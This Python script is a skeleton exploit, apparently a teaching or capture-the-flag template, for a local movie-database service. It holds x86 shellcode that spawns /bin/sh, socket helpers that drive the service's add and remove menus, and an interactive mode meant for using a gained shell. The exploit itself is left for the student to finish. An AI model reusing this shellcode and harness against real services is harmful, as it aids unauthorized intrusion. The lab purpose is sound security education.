#!/usr/bin/python

from sock import *
import sys
import time

################################################################
# Skeleton exploit for use                                     #
# Uses a nice socket library (https://github.com/hellman/sock/)#
# Actually read this ans feel free to modify!                  #
################################################################


# Change this to the attack host to get your key
HOST = "localhost"

# This should be your port number
PORT = "55000"

# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

# A useful function to wait for the user to press enter, that way you can put in pause points easily
def pause_script():
    raw_input("Paused... Press enter to continue")

def connect():
    con = Sock(HOST+":"+PORT)
    return con

# This will clear the read buffer and print all of it
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        print r
        r = con.read_one(0)


# This will remove a movie, and tell you success
def remove_movie(title,con):
    # Choose the remove option from the main menu
    con.send_line("d")
    
    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

# This will add a movie
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    con.send_line(movie["director"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

# Switches to an interactive mode, good for shells maybe
# You can't get out of interactive mode
def go_interactive(con):
    while True:
        time.sleep(1)
        print con.read_one(0)
        con.write(sys.stdin.readline())

# Here is an example:
hacker = {"title":"Hackers",
          "director":"Iain Softley",
          "star1":"Jonny Lee Miller",
          "star2":"Angelina Jolie",
          "star3":"Jessie Bradford",
          "star4":"Matthew Lillard",
          "star5":"Laurence Mason",
          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
          "country":"USA",
          "budget":"UNK",
          "opening_weekend":"UNK",
          "gross":"$7,564,000",
          "runtime":"107 min",
          "aspect":"2.35 : 1",
          "composer":"Someone",
          "average_rating":"5.0"}

# Start the connection
con = connect()

# Pause the script until the user presses enter (useful for running under gdb and setting breakpoints)
pause_script()

# Send the movie
send_movie(hacker,con)

# Delete the movie
if remove_movie("Hackers",con):
    print "Deleted!"
else:
    print "Didn't delete :("
